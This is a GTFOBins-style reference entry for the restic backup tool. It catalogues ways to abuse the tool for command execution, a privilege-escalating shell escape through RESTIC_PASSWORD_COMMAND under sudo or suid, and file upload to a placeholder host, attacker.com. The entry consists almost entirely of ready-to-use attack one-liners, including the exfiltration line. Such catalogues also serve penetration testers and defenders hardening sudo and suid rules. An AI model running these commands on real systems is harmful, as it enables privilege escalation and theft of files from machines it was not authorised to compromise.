---
type: gtfobin
name: restic
platform: Unix
functions: [command, shell, upload]
tags: [gtfobin, unix, lotl]
---

# restic

## command

```bash
RESTIC_PASSWORD_COMMAND='/path/to/command' restic backup
```
**Contexts:** sudo, suid, unprivileged

```bash
restic --password-command='/path/to/command' backup
```
**Contexts:** sudo, suid, unprivileged

## shell

```bash
RESTIC_PASSWORD_COMMAND='/bin/sh -c "/bin/sh 0<&2 1<&2"' restic backup
```
**Contexts:** sudo, suid, unprivileged

```bash
restic --password-command='/bin/sh -c "/bin/sh 0<&2 1<&2"' backup
```
**Contexts:** sudo, suid, unprivileged

## upload

```bash
restic backup -r rest:http://attacker.com:12345/x /path/to/input-file
```
**Contexts:** sudo, suid, unprivileged
